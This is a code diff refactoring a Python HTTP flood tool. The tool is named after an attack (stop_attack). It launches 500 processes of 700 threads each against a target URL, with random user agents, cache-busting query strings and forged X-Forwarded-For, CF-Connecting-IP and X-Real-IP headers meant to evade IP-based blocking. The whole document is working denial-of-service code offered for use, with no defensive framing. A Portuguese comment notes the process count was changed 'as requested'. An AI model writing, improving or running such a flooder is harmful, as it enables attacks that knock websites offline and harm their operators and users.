@@ -15,7 +15,6 @@ headers_useragents = []
 headers_referers = []
 request_counter = 0
 flag = 0
-threads = []
 
 def load_useragents():
     with open('useragents.txt', 'r') as f:
@@ -32,12 +31,6 @@ def generate_ip(block):
     network = ipaddress.ip_network(block, strict=False)
     return str(ipaddress.ip_address(random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)))
 
-def generate_spoofed_ip():
-    return generate_ip(random.choice(isp_blocks))
-
-def generate_real_ip():
-    return generate_ip(random.choice(isp_blocks))
-
 def generate_cookie():
     expires = (datetime.now() + timedelta(days=1)).strftime('%a, %d-%b-%Y %H:%M:%S GMT')
     return f"sessionid=value{random.randint(1, 100000)}; Expires={expires}; Domain={host}; Path=/; Secure; HttpOnly"
@@ -53,15 +46,15 @@ def stop_attack():
     global flag
     flag = 2
 
-def httpcall(url):
+def httpcall(url, isp_blocks, real_ips):
     request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
     headers = {
         'User-Agent': random.choice(headers_useragents),
         'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
-        'X-Forwarded-For': generate_spoofed_ip(),
+        'X-Forwarded-For': generate_ip(random.choice(isp_blocks)),
         'Cookie': generate_cookie(),
-        'CF-Connecting-IP': generate_real_ip(),
-        'X-Real-IP': generate_real_ip(),
+        'CF-Connecting-IP': generate_ip(random.choice(real_ips)),
+        'X-Real-IP': generate_ip(random.choice(real_ips)),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'en-US,en;q=0.5',
@@ -79,14 +72,21 @@ def httpcall(url):
         inc_counter()
 
 class HTTPThread(threading.Thread):
+    def __init__(self, url, isp_blocks, real_ips):
+        super().__init__()
+        self.url = url
+        self.isp_blocks = isp_blocks
+        self.real_ips = real_ips
+
     def run(self):
         while flag < 2:
-            httpcall(url)
+            httpcall(self.url, self.isp_blocks, self.real_ips)
             time.sleep(random.uniform(0.1, 0.5))
 
-def worker():
+def worker(url, isp_blocks, real_ips):
+    threads = []
     for _ in range(700):
-        t = HTTPThread()
+        t = HTTPThread(url, isp_blocks, real_ips)
         t.start()
         threads.append(t)
     for t in threads:
@@ -101,11 +101,18 @@ if __name__ == "__main__":
         url += "/"
     m = re.search('(https?://)?([^/]*)/?.*', url)
     host = m.group(2)
-    processes = [multiprocessing.Process(target=worker) for _ in range(500)]
-    for p in processes:
-        p.start()
-    for p in processes:
-        p.join()
+    isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
+    real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
+    
+    processes = []
+    for _ in range(500): # Alterado para 500 processos conforme solicitado
+        process = multiprocessing.Process(target=worker, args=(url, isp_blocks, real_ips))
+        processes.append(process)
+        process.start()
+        
+    for process in processes:
+        process.join()
+        
     try:
         stop_attack()
     except KeyboardInterrupt:
